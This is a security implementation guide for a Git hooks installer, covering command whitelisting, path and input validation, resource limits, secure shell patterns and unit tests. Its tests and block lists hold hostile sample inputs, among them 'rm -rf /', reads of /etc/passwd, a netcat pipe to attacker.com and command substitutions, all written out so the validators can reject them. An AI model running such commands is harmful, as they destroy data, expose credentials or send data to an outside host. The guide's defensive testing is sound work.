# Security Implementation Guide

This document provides detailed implementation guidance for the security components in the Git Hooks Installer system, including code examples, best practices, and troubleshooting information.

## Table of Contents

1. [Security Architecture Overview](#security-architecture-overview)
2. [SecureGitWrapper Implementation](#securegitWrapper-implementation)
3. [FileTracker Security Features](#filetracker-security-features)
4. [Repository Validation](#repository-validation)
5. [Input Sanitization Framework](#input-sanitization-framework)
6. [Error Handling & Information Disclosure Prevention](#error-handling--information-disclosure-prevention)
7. [Resource Protection](#resource-protection)
8. [Shell Script Security](#shell-script-security)
9. [Security Testing Guidelines](#security-testing-guidelines)
10. [Troubleshooting Security Issues](#troubleshooting-security-issues)

## Security Architecture Overview

The security implementation follows a **defense-in-depth** strategy with multiple layers of protection:

```
User Input → Input Validation → Command Validation → Process Isolation → File System Security → Git Security → Audit Logging
```

### Core Security Principles

1. **Fail Secure:** All security failures result in safe defaults
2. **Least Privilege:** Minimal permissions for all operations
3. **Input Validation:** Trust nothing from external sources
4. **Audit Everything:** Comprehensive logging of all operations
5. **Atomic Operations:** All-or-nothing transaction semantics

## SecureGitWrapper Implementation

### Class Architecture

```python
class SecureGitWrapper:
    """Secure wrapper for Git commands with comprehensive validation."""
    
    # Command whitelist - only these commands are allowed
    ALLOWED_COMMANDS = {
        'status': ['--porcelain', '--show-stash'],
        'branch': ['--show-current', '--list', '-D'],
        'checkout': ['-b', '--quiet'],
        'add': [],  # File paths validated separately
        'commit': ['-m', '--quiet'],
        'push': ['origin'],  # Branch names validated
        'remote': ['get-url', 'origin'],
        'init': ['--quiet'],
        'config': ['user.name', 'user.email'],
        'show-ref': ['--verify', '--quiet'],
        'log': ['--oneline'],
        'diff': ['--cached', '--name-only'],
        'ls-files': ['--others', '--exclude-standard'],
        'reset': ['--hard', 'HEAD', '--quiet'],
        'clean': ['-fd', '--quiet']
    }
```

### Validation Pipeline

#### 1. Command Validation

```python
def _validate_command(self, git_command: str, args: List[str]) -> None:
    """Validate Git command and arguments against whitelist."""
    
    # Check if command is allowed
    if git_command not in self.ALLOWED_COMMANDS:
        raise SecureGitError(f"Git command not allowed: {git_command}")
    
    # Validate each argument
    allowed_args = self.ALLOWED_COMMANDS[git_command]
    for arg in args:
        # Skip file paths and branch names (validated separately)
        if arg.startswith('-') and arg not in allowed_args:
            raise SecureGitError(f"Argument not allowed for {git_command}: {arg}")
```

#### 2. Branch Name Validation

```python
def _validate_branch_name(self, branch_name: str) -> None:
    """Validate branch name against security policy."""
    
    # Basic checks
    if not branch_name:
        raise SecureGitError("Branch name cannot be empty")
    
    # Length check
    if len(branch_name) > 255:
        raise SecureGitError("Branch name too long")
    
    # Pattern validation - prevents command injection
    if not self.BRANCH_NAME_PATTERN.match(branch_name):
        raise SecureGitError(f"Invalid branch name format: {branch_name}")
    
    # Additional security checks
    forbidden_patterns = ['..', '//', '\\', ';', '&', '|', '`', '$']
    for pattern in forbidden_patterns:
        if pattern in branch_name:
            raise SecureGitError(f"Forbidden pattern in branch name: {pattern}")
```

#### 3. Path Validation

```python
def _validate_file_path(self, file_path: str) -> Path:
    """Validate and sanitize file path for security."""
    
    try:
        path = Path(file_path)
        
        # Check for path traversal attempts
        if '..' in path.parts:
            raise SecureGitError(f"Path traversal detected: {file_path}")
        
        # Ensure path is within repository bounds
        if path.is_absolute():
            try:
                # Verify absolute path is within repo
                path.relative_to(self.repo_path)
            except ValueError:
                raise SecureGitError(f"Absolute path outside repository: {file_path}")
        else:
            # Verify relative path stays within repo
            full_path = self.repo_path / path
            try:
                full_path.relative_to(self.repo_path)
            except ValueError:
                raise SecureGitError(f"Relative path escapes repository: {file_path}")
        
        return path
        
    except Exception as e:
        raise SecureGitError(f"Invalid file path: {file_path} - {str(e)}")
```

### Secure Execution

```python
def run(self, git_command: str, *args: str, check: bool = True) -> subprocess.CompletedProcess:
    """Execute Git command with comprehensive security measures."""
    
    # Validation pipeline
    args_list = list(args)
    self._validate_command(git_command, args_list)
    
    # Build secure command
    cmd = self._build_command(git_command, *args_list)
    
    try:
        # Execute with security controls
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',           # Handle invalid characters gracefully
            check=check,
            timeout=self.timeout,       # Prevent hanging
            shell=False,               # CRITICAL: Never use shell=True
            env={                      # Secure environment
                **os.environ, 
                'GIT_TERMINAL_PROMPT': '0'  # Disable interactive prompts
            }
        )
        
        return result
        
    except subprocess.TimeoutExpired:
        raise SecureGitError(f"Git command timed out after {self.timeout} seconds")
    except subprocess.CalledProcessError as e:
        # Sanitized error handling
        sanitized_cmd = " ".join(cmd[:2])  # Only show 'git <command>'
        logger.debug(f"Git command failed: {' '.join(cmd)}")
        logger.debug(f"Error output: {e.stderr}")
        raise SecureGitError(f"{sanitized_cmd}: Command execution failed")
```

## FileTracker Security Features

### Resource Protection

```python
class FileTracker:
    # Resource limits to prevent DoS attacks
    MAX_FILES = 1000
    MAX_DIRECTORIES = 100
    MAX_FILE_SIZE = 10 * 1024 * 1024      # 10MB per file
    MAX_TOTAL_SIZE = 100 * 1024 * 1024    # 100MB total
    
    def track_file_creation(self, file_path: str, category: str = "general"):
        # Resource limit enforcement
        if len(self.created_files) >= self.MAX_FILES:
            raise ValueError(f"Maximum file limit exceeded ({self.MAX_FILES})")
        
        # File size validation
        full_path = self.repo_path / normalized_path
        if full_path.exists():
            file_size = full_path.stat().st_size
            if file_size > self.MAX_FILE_SIZE:
                raise ValueError(f"File too large: {normalized_path} ({file_size} bytes)")
            
            if self.total_size_tracked + file_size > self.MAX_TOTAL_SIZE:
                raise ValueError(f"Total size limit exceeded ({self.MAX_TOTAL_SIZE} bytes)")
            
            self.total_size_tracked += file_size
```

### Atomic File Operations

```python
def safe_add_tracked_files(self, skip_validation: bool = False) -> bool:
    """Add files to staging area with atomic operations and race condition protection."""
    
    # File locking to prevent race conditions
    lock_file_path = self.repo_path / ".git" / "installer.lock"
    lock_file = None
    
    try:
        # Acquire exclusive lock
        lock_file = open(lock_file_path, 'w')
        fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        
        # Reset staging area for clean state
        subprocess.run(["git", "-C", str(self.repo_path), "reset", "--quiet"])
        
        # Collect valid files first
        valid_files = []
        for file_path in self.get_all_tracked_files():
            full_path = self.repo_path / file_path
            if full_path.exists():
                valid_files.append(file_path)
        
        # Add all files atomically
        if valid_files:
            subprocess.run(
                ["git", "-C", str(self.repo_path), "add", "--"] + valid_files,
                check=True
            )
        
        # Validate staging area
        return self.validate_staging_area() if not skip_validation else True
        
    except BlockingIOError:
        logger.error("Another git operation is in progress. Please wait and try again.")
        return False
    finally:
        # Always release lock
        if lock_file:
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_UN)
            lock_file.close()
            lock_file_path.unlink(missing_ok=True)
```

### Staging Validation

```python
def validate_staging_area(self, debug: bool = False) -> bool:
    """Ensure staging area contains only tracked files."""
    
    # Use temporary file for atomic read
    with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmp_file:
        tmp_path = tmp_file.name
    
    try:
        # Get staged files atomically
        result = subprocess.run(
            ["git", "-C", str(self.repo_path), "diff", "--cached", "--name-only"],
            capture_output=True, text=True, timeout=10
        )
        
        # Write to temp file for atomic operation
        with open(tmp_path, 'w') as f:
            f.write(result.stdout)
        
        # Read back atomically
        with open(tmp_path, 'r') as f:
            staged_output = f.read()
        
        # Normalize paths for comparison
        staged_files = set(self._normalize_path(f) for f in staged_output.strip().split('\n') if f.strip())
        tracked_files = set(self._normalize_path(f) for f in self.get_all_tracked_files() if f.strip())
        
        # Security check: no unexpected files
        unexpected_files = staged_files - tracked_files
        if unexpected_files:
            logger.error("❌ Unexpected files in staging area:")
            for file_path in sorted(unexpected_files):
                logger.error(f"   {file_path}")
            return False
        
        return True
        
    finally:
        try:
            os.unlink(tmp_path)
        except:
            pass
```

## Repository Validation

### Pre-Flight Security Checks

```python
class RepositoryValidator:
    def validate_all(self, branch_pattern: Optional[str] = None) -> bool:
        """Run comprehensive security validation."""
        
        self.validation_errors.clear()
        
        validations = [
            self.validate_git_repository(),        # Basic structure
            self.validate_clean_working_tree(),    # No uncommitted changes
            self.validate_git_config(),            # User configuration
        ]
        
        # Branch-specific validation
        if branch_pattern:
            validations.append(
                self.validate_no_conflicting_branches(branch_pattern)
            )
        
        # Security-specific checks
        validations.extend([
            self.validate_repository_permissions(),
            self.check_for_sensitive_files(),
            self.validate_git_hooks_safety()
        ])
        
        return all(validations)
```

### Sensitive File Detection

```python
def detect_sensitive_files(self) -> List[str]:
    """Detect potentially sensitive files that should never be committed."""
    
    sensitive_patterns = [
        # Environment files
        ".env", "*.env", ".env.*",
        
        # Cryptographic files
        "*.key", "*.pem", "*.p12", "*.pfx", "*.crt",
        
        # Configuration files with secrets
        "config.json", "secrets.json", "credentials.json",
        "database.yml", "application.yml",
        
        # Secret files
        "*.secret", "*.secrets", 
        "password*", "*password*", "*passwd*",
        "api_key*", "*api_key*", "*apikey*",
        
        # Cloud credentials
        ".aws/credentials", ".gcp/credentials.json",
        ".ssh/id_*", ".ssh/*_rsa", ".ssh/*_dsa",
        
        # IDE and editor files with secrets
        ".vscode/settings.json", ".idea/workspace.xml",
        
        # Backup files
        "*.bak", "*.backup", "*.tmp", "*~"
    ]
    
    sensitive_files = []
    
    try:
        # Get untracked files
        result = subprocess.run(
            ["git", "-C", str(self.repo_path), "ls-files", "--others", "--exclude-standard"],
            capture_output=True, text=True, timeout=10
        )
        
        untracked_files = result.stdout.strip().split('\n') if result.stdout.strip() else []
        
        # Pattern matching with security focus
        for file_path in untracked_files:
            file_name = Path(file_path).name.lower()
            file_content = self._safe_file_preview(self.repo_path / file_path)
            
            # Pattern matching
            for pattern in sensitive_patterns:
                pattern_lower = pattern.lower().replace('*', '')
                if pattern_lower in file_name:
                    sensitive_files.append(file_path)
                    break
            
            # Content-based detection
            if self._contains_sensitive_content(file_content):
                sensitive_files.append(file_path)
                
    except subprocess.CalledProcessError:
        pass  # Non-critical if we can't check
        
    return sensitive_files

def _contains_sensitive_content(self, content: str) -> bool:
    """Check file content for sensitive patterns."""
    
    if not content or len(content) > 10240:  # Skip large files
        return False
    
    content_lower = content.lower()
    
    # Common secret patterns
    secret_indicators = [
        'password=', 'passwd=', 'pwd=',
        'api_key=', 'apikey=', 'api-key=',
        'secret=', 'secret_key=',
        'private_key=', 'private-key=',
        'access_token=', 'auth_token=',
        'database_url=', 'db_password=',
        'aws_access_key=', 'aws_secret=',
        'oauth_token=', 'bearer_token='
    ]
    
    return any(indicator in content_lower for indicator in secret_indicators)
```

## Input Sanitization Framework

### Universal Input Validation

```python
class InputValidator:
    """Central input validation with security focus."""
    
    # Validation patterns
    PATTERNS = {
        'branch_name': r'^[a-zA-Z0-9/_.-]+$',
        'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
        'name': r'^[a-zA-Z\s.-]+$',
        'commit_hash': r'^[a-f0-9]{8,40}$',
        'url': r'^(https?://|git@)[\\w.-]+(/|:)[\\w.-]+/[\\w.-]+(\\.git)?$'
    }
    
    # Length limits
    LIMITS = {
        'branch_name': 255,
        'email': 254,
        'name': 100,
        'commit_message': 5000,
        'file_path': 4096
    }
    
    @staticmethod
    def validate_input(value: str, input_type: str, required: bool = True) -> bool:
        """Universal input validation with security checks."""
        
        # Required field check
        if not value and required:
            raise ValueError(f"{input_type} is required")
        
        if not value and not required:
            return True
        
        # Length validation
        if input_type in InputValidator.LIMITS:
            max_length = InputValidator.LIMITS[input_type]
            if len(value) > max_length:
                raise ValueError(f"{input_type} exceeds maximum length ({max_length})")
        
        # Pattern validation
        if input_type in InputValidator.PATTERNS:
            pattern = InputValidator.PATTERNS[input_type]
            if not re.match(pattern, value):
                raise ValueError(f"Invalid {input_type} format")
        
        # Security-specific checks
        if InputValidator._contains_injection_patterns(value):
            raise ValueError(f"Potential injection detected in {input_type}")
        
        return True
    
    @staticmethod
    def _contains_injection_patterns(value: str) -> bool:
        """Check for common injection patterns."""
        
        injection_patterns = [
            ';', '&&', '||', '`', '$(',  # Command injection
            '../', '..\\', '/./', '\\.\\',  # Path traversal
            '<script', 'javascript:',    # Script injection
            'DROP TABLE', 'SELECT *',    # SQL injection
            '${', '#{',                  # Template injection
        ]
        
        value_lower = value.lower()
        return any(pattern.lower() in value_lower for pattern in injection_patterns)
```

### Branch Name Validation Implementation

```python
def validate_branch_name(branch_name: str) -> str:
    """Comprehensive branch name validation for security."""
    
    if not branch_name:
        raise ValueError("Branch name cannot be empty")
    
    # Length check
    if len(branch_name) > 255:
        raise ValueError("Branch name too long (max 255 characters)")
    
    # Pattern validation
    if not re.match(r'^[a-zA-Z0-9/_.-]+$', branch_name):
        raise ValueError("Branch name contains invalid characters")
    
    # Git-specific restrictions
    if branch_name.startswith('.') or branch_name.endswith('.'):
        raise ValueError("Branch name cannot start or end with a dot")
    
    if '/.' in branch_name or './' in branch_name:
        raise ValueError("Branch name cannot contain '/.' or './'")
    
    if branch_name.startswith('/') or branch_name.endswith('/'):
        raise ValueError("Branch name cannot start or end with a slash")
    
    if '//' in branch_name:
        raise ValueError("Branch name cannot contain consecutive slashes")
    
    # Security-specific checks
    forbidden_names = ['HEAD', 'master', 'main', '..', '.', 'refs']
    if branch_name in forbidden_names:
        raise ValueError(f"Branch name '{branch_name}' is reserved")
    
    return branch_name
```

## Error Handling & Information Disclosure Prevention

### Sanitized Error Reporting

```python
class SecureLogger:
    """Security-focused logging with information disclosure prevention."""
    
    def __init__(self, component_name: str):
        self.logger = logging.getLogger(component_name)
        self.component = component_name
    
    def log_error(self, operation: str, error: Exception, user_message: str = None):
        """Log error with sanitization for security."""
        
        # User-facing message (sanitized)
        if user_message:
            self.logger.error(f"{operation}: {user_message}")
        else:
            self.logger.error(f"{operation}: Operation failed")
        
        # Detailed technical information (debug only)
        self.logger.debug(f"Component: {self.component}")
        self.logger.debug(f"Operation: {operation}")
        self.logger.debug(f"Error type: {type(error).__name__}")
        self.logger.debug(f"Error details: {str(error)}")
        
        # Security event logging
        if self._is_security_relevant(error):
            self.logger.warning(f"Security event in {self.component}: {operation}")
    
    def _is_security_relevant(self, error: Exception) -> bool:
        """Determine if error indicates a security issue."""
        
        security_indicators = [
            'SecureGitError', 'ValidationError', 'PermissionError',
            'path traversal', 'injection', 'timeout', 'lock'
        ]
        
        error_str = str(error).lower()
        return any(indicator.lower() in error_str for indicator in security_indicators)
```

### Production Error Messages

```python
def handle_git_error(operation: str, error: subprocess.CalledProcessError) -> str:
    """Generate user-friendly error message without information disclosure."""
    
    # Generic user messages based on operation type
    user_messages = {
        'clone': "Repository cloning failed. Check repository URL and permissions.",
        'commit': "Commit operation failed. Ensure repository is in a valid state.",
        'push': "Push operation failed. Check network connectivity and permissions.",
        'branch': "Branch operation failed. Verify branch name and repository state.",
        'add': "File staging failed. Check file permissions and disk space.",
        'status': "Status check failed. Verify this is a valid Git repository."
    }
    
    # Default message for unknown operations
    user_message = user_messages.get(operation, "Git operation failed")
    
    # Log detailed error for debugging (not shown to user)
    logger.debug(f"Git command failed: {error.cmd}")
    logger.debug(f"Return code: {error.returncode}")
    logger.debug(f"STDOUT: {error.stdout}")
    logger.debug(f"STDERR: {error.stderr}")
    
    return user_message
```

## Resource Protection

### Memory and Process Limits

```python
class ResourceManager:
    """Manage system resources to prevent DoS attacks."""
    
    # System resource limits
    MAX_MEMORY_MB = 512        # 512MB max memory usage
    MAX_PROCESS_TIME = 300     # 5 minutes max execution time
    MAX_OPEN_FILES = 100       # 100 file handles max
    MAX_SUBPROCESS_COUNT = 10  # 10 concurrent subprocesses max
    
    def __init__(self):
        self.start_time = time.time()
        self.subprocess_count = 0
        self.open_files = []
        self.memory_usage = 0
    
    def check_resource_limits(self) -> None:
        """Check if resource limits are being approached."""
        
        # Time limit check
        elapsed_time = time.time() - self.start_time
        if elapsed_time > self.MAX_PROCESS_TIME:
            raise ResourceError("Process time limit exceeded")
        
        # Memory limit check
        process = psutil.Process(os.getpid())
        memory_mb = process.memory_info().rss / 1024 / 1024
        if memory_mb > self.MAX_MEMORY_MB:
            raise ResourceError("Memory limit exceeded")
        
        # File handle limit check
        if len(self.open_files) > self.MAX_OPEN_FILES:
            raise ResourceError("Too many open files")
        
        # Subprocess limit check
        if self.subprocess_count > self.MAX_SUBPROCESS_COUNT:
            raise ResourceError("Too many concurrent subprocesses")
    
    def track_subprocess(self, cmd: List[str]) -> None:
        """Track subprocess creation for limits."""
        
        self.subprocess_count += 1
        self.check_resource_limits()
        
        # Log subprocess for monitoring
        logger.debug(f"Started subprocess {self.subprocess_count}: {' '.join(cmd[:2])}")
    
    def cleanup_subprocess(self) -> None:
        """Clean up after subprocess completion."""
        
        if self.subprocess_count > 0:
            self.subprocess_count -= 1
```

### File Size and Count Limits

```python
def enforce_file_limits(file_path: Path, max_size: int = 10 * 1024 * 1024) -> None:
    """Enforce file size limits for security."""
    
    if not file_path.exists():
        return
    
    file_size = file_path.stat().st_size
    
    if file_size > max_size:
        raise ValueError(f"File exceeds size limit: {file_path.name} ({file_size} bytes > {max_size} bytes)")
    
    # Check for suspicious file characteristics
    if file_size == 0:
        logger.warning(f"Empty file detected: {file_path}")
    
    # Binary file detection
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            f.read(1024)  # Try to read as text
    except UnicodeDecodeError:
        logger.warning(f"Binary file detected: {file_path}")
        # Additional checks for binary files could go here
```

## Shell Script Security

### Secure Shell Scripting Patterns

```bash
#!/bin/bash
# Secure shell script template

set -euo pipefail  # Exit on error, undefined vars, pipe failures

# Input validation function
validate_branch_name() {
    local branch_name="$1"
    
    # Check if empty
    if [ -z "$branch_name" ]; then
        echo "ERROR: Branch name cannot be empty"
        exit 1
    fi
    
    # Pattern validation
    if ! [[ "$branch_name" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then
        echo "ERROR: Invalid branch name: $branch_name"
        echo "Branch names must only contain alphanumeric characters, /, _, ., and -"
        exit 1
    fi
    
    # Length validation
    if [ ${#branch_name} -gt 255 ]; then
        echo "ERROR: Branch name too long (max 255 characters)"
        exit 1
    fi
}

# Path validation function
validate_path() {
    local file_path="$1"
    local base_path="$2"
    
    # Use realpath to resolve symlinks and relative paths
    local real_file_path
    local real_base_path
    
    real_file_path=$(realpath "$file_path" 2>/dev/null || echo "")
    real_base_path=$(realpath "$base_path" 2>/dev/null || echo "")
    
    if [ -z "$real_file_path" ] || [ -z "$real_base_path" ]; then
        echo "ERROR: Could not validate paths"
        exit 1
    fi
    
    # Check if file path is within base path
    if [[ "$real_file_path" != "$real_base_path/"* ]]; then
        echo "ERROR: Path outside allowed directory: $file_path"
        exit 1
    fi
}

# Safe variable usage
BRANCH_NAME="${BRANCH_NAME:-}"
REPO_ROOT="${REPO_ROOT:-}"

# Validate inputs
validate_branch_name "$BRANCH_NAME"

# Safe command execution
git_safe() {
    local cmd="$1"
    shift
    
    # Use timeout to prevent hanging
    timeout 30 git "$cmd" "$@"
    local exit_code=$?
    
    if [ $exit_code -eq 124 ]; then
        echo "ERROR: Git command timed out"
        exit 1
    elif [ $exit_code -ne 0 ]; then
        echo "ERROR: Git command failed"
        exit $exit_code
    fi
}

# Use quotes and proper escaping
LOG_DIR="${REPO_ROOT}/docs/commit-logs/${BRANCH_NAME}"
README_FILE="${LOG_DIR}/README.md"

# Validate paths before use
validate_path "$LOG_DIR" "$REPO_ROOT/docs/commit-logs"

# Safe file operations
if [ ! -d "$LOG_DIR" ]; then
    echo "ERROR: Log directory does not exist: $LOG_DIR"
    exit 1
fi

# Use -- to separate options from arguments
git_safe add -- "$README_FILE"
git_safe commit -m "Update README for branch: $BRANCH_NAME"
```

### Environment Variable Security

```bash
# Secure environment variable handling

# Set secure defaults
export GIT_TERMINAL_PROMPT=0
export LANG=C.UTF-8
export LC_ALL=C.UTF-8

# Validate critical environment variables
validate_env_var() {
    local var_name="$1"
    local var_value="$2"
    local pattern="$3"
    
    if [ -z "$var_value" ]; then
        echo "ERROR: Required environment variable not set: $var_name"
        exit 1
    fi
    
    if ! [[ "$var_value" =~ $pattern ]]; then
        echo "ERROR: Invalid format for $var_name"
        exit 1
    fi
}

# Validate environment
validate_env_var "BRANCH_NAME" "$BRANCH_NAME" "^[a-zA-Z0-9/_.-]+$"
validate_env_var "REPO_ROOT" "$REPO_ROOT" "^[a-zA-Z0-9/_.-]+$"

# Sanitize PATH to prevent injection
export PATH="/usr/bin:/bin:/usr/local/bin"
```

## Security Testing Guidelines

### Unit Testing Security Features

```python
import unittest
from unittest.mock import patch, MagicMock
import tempfile
import os
from pathlib import Path

class TestSecureGitWrapper(unittest.TestCase):
    """Test security features of SecureGitWrapper."""
    
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.repo_path = Path(self.temp_dir)
        self.wrapper = SecureGitWrapper(self.repo_path)
    
    def test_command_injection_prevention(self):
        """Test that command injection attempts are blocked."""
        
        # Test malicious branch names
        malicious_branches = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(id)",
            "../../../etc/passwd"
        ]
        
        for malicious_branch in malicious_branches:
            with self.assertRaises(SecureGitError):
                self.wrapper.create_branch(malicious_branch)
    
    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are blocked."""
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\hosts",
            "/etc/passwd",
            "C:\\Windows\\System32\\cmd.exe",
            "file/../../secret.txt"
        ]
        
        for malicious_path in malicious_paths:
            with self.assertRaises(SecureGitError):
                self.wrapper.add_file(malicious_path)
    
    def test_timeout_protection(self):
        """Test that operations timeout appropriately."""
        
        with patch('subprocess.run') as mock_run:
            # Simulate timeout
            mock_run.side_effect = subprocess.TimeoutExpired(['git', 'status'], 30)
            
            with self.assertRaises(SecureGitError):
                self.wrapper.run('status')
    
    def tearDown(self):
        import shutil
        shutil.rmtree(self.temp_dir)

class TestInputValidation(unittest.TestCase):
    """Test input validation functions."""
    
    def test_branch_name_validation(self):
        """Test branch name validation."""
        
        # Valid names
        valid_names = [
            "feature/new-feature",
            "bugfix/issue-123",
            "release/v1.0.0",
            "main",
            "develop"
        ]
        
        for name in valid_names:
            self.assertTrue(InputValidator.validate_input(name, 'branch_name'))
        
        # Invalid names
        invalid_names = [
            "; rm -rf /",
            "../../../etc/passwd",
            "name with spaces",
            "name@with@symbols",
            "name|with|pipes",
            ""  # Empty name
        ]
        
        for name in invalid_names:
            with self.assertRaises(ValueError):
                InputValidator.validate_input(name, 'branch_name')
    
    def test_email_validation(self):
        """Test email validation."""
        
        valid_emails = [
            "user@example.com",
            "test.user@domain.org",
            "user+tag@example.co.uk"
        ]
        
        for email in valid_emails:
            self.assertTrue(InputValidator.validate_input(email, 'email'))
        
        invalid_emails = [
            "not-an-email",
            "@domain.com",
            "user@",
            "user space@domain.com",
            "user;rm -rf /@domain.com"
        ]
        
        for email in invalid_emails:
            with self.assertRaises(ValueError):
                InputValidator.validate_input(email, 'email')
```

### Integration Testing

```python
class TestSecurityIntegration(unittest.TestCase):
    """Integration tests for security features."""
    
    def setUp(self):
        self.test_repo = tempfile.mkdtemp()
        # Initialize git repo
        subprocess.run(['git', 'init'], cwd=self.test_repo)
        subprocess.run(['git', 'config', 'user.name', 'Test User'], cwd=self.test_repo)
        subprocess.run(['git', 'config', 'user.email', 'test@example.com'], cwd=self.test_repo)
    
    def test_full_installation_security(self):
        """Test complete installation process with security validation."""
        
        installer = GitHooksInstaller(
            target_repo=Path(self.test_repo),
            source_dir=Path(__file__).parent / "test_fixtures",
            force=False
        )
        
        # Test pre-flight checks
        self.assertTrue(installer.pre_flight_checks())
        
        # Test installation with file tracking
        with patch.object(installer, 'push_feature_branch', return_value=True):
            result = installer.install()
            
        self.assertTrue(result)
        
        # Verify only tracked files were committed
        result = subprocess.run(
            ['git', 'log', '--name-only', '--oneline', '-1'],
            cwd=self.test_repo, capture_output=True, text=True
        )
        
        committed_files = result.stdout.strip().split('\n')[1:]  # Skip commit message
        tracked_files = installer.file_tracker.get_all_tracked_files()
        
        # All committed files should be tracked
        for committed_file in committed_files:
            self.assertIn(committed_file, tracked_files)
```

## Troubleshooting Security Issues

### Common Security Error Messages

| **Error Message** | **Cause** | **Solution** |
|------------------|----------|-------------|
| `SecureGitError: Git command not allowed` | Attempting to use non-whitelisted git command | Use only approved git commands via SecureGitWrapper |
| `SecureGitError: Invalid branch name format` | Branch name contains forbidden characters | Use only alphanumeric, /, _, ., - in branch names |
| `SecureGitError: Path traversal detected` | File path contains `..` or other traversal attempts | Use relative paths within repository |
| `ValueError: Maximum file limit exceeded` | Too many files being tracked | Reduce number of files or increase limits |
| `BlockingIOError: Another git operation in progress` | Race condition with file locking | Wait for other operation to complete |

### Security Debugging

```python
def debug_security_issue(component: str, operation: str, error: Exception):
    """Debug security-related issues with detailed logging."""
    
    logger.info(f"=== Security Debug Information ===")
    logger.info(f"Component: {component}")
    logger.info(f"Operation: {operation}")
    logger.info(f"Error Type: {type(error).__name__}")
    logger.info(f"Error Message: {str(error)}")
    logger.info(f"Timestamp: {datetime.now().isoformat()}")
    
    # Environment information
    logger.info(f"Python Version: {sys.version}")
    logger.info(f"Platform: {platform.platform()}")
    logger.info(f"Working Directory: {os.getcwd()}")
    
    # Git environment
    try:
        git_version = subprocess.run(['git', '--version'], capture_output=True, text=True)
        logger.info(f"Git Version: {git_version.stdout.strip()}")
    except:
        logger.info("Git Version: Not available")
    
    # Repository state (if applicable)
    if os.path.exists('.git'):
        try:
            branch = subprocess.run(['git', 'branch', '--show-current'], 
                                  capture_output=True, text=True)
            logger.info(f"Current Branch: {branch.stdout.strip()}")
            
            status = subprocess.run(['git', 'status', '--porcelain'], 
                                  capture_output=True, text=True)
            logger.info(f"Repository Status: {'Clean' if not status.stdout.strip() else 'Modified'}")
        except:
            logger.info("Repository State: Unable to determine")
    
    logger.info("=== End Security Debug ===")
```

### Performance Monitoring

```python
class SecurityMetrics:
    """Collect security-related performance metrics."""
    
    def __init__(self):
        self.metrics = {
            'validation_time': [],
            'file_operations': 0,
            'git_commands': 0,
            'security_errors': 0,
            'resource_warnings': 0
        }
    
    def record_validation_time(self, operation: str, duration: float):
        """Record validation timing."""
        self.metrics['validation_time'].append({
            'operation': operation,
            'duration': duration,
            'timestamp': time.time()
        })
    
    def record_security_event(self, event_type: str):
        """Record security events."""
        if event_type in self.metrics:
            self.metrics[event_type] += 1
    
    def get_security_report(self) -> dict:
        """Generate security performance report."""
        
        total_validations = len(self.metrics['validation_time'])
        avg_validation_time = 0
        
        if total_validations > 0:
            avg_validation_time = sum(
                v['duration'] for v in self.metrics['validation_time']
            ) / total_validations
        
        return {
            'total_validations': total_validations,
            'average_validation_time': avg_validation_time,
            'file_operations': self.metrics['file_operations'],
            'git_commands': self.metrics['git_commands'],
            'security_errors': self.metrics['security_errors'],
            'resource_warnings': self.metrics['resource_warnings'],
            'security_score': self._calculate_security_score()
        }
    
    def _calculate_security_score(self) -> float:
        """Calculate security score based on metrics."""
        
        # Simple scoring algorithm (0-100)
        base_score = 100
        
        # Deduct for security errors
        error_penalty = min(self.metrics['security_errors'] * 10, 50)
        base_score -= error_penalty
        
        # Deduct for resource warnings
        resource_penalty = min(self.metrics['resource_warnings'] * 5, 25)
        base_score -= resource_penalty
        
        # Adjust for performance
        if len(self.metrics['validation_time']) > 0:
            avg_time = sum(v['duration'] for v in self.metrics['validation_time']) / len(self.metrics['validation_time'])
            if avg_time > 1.0:  # Slow validation
                base_score -= 10
        
        return max(base_score, 0)
```

---

**Document Version:** 1.0  
**Last Updated:** 2025-01-15  
**Security Review Date:** 2025-04-15  
**Contact:** security@development-toolbox.org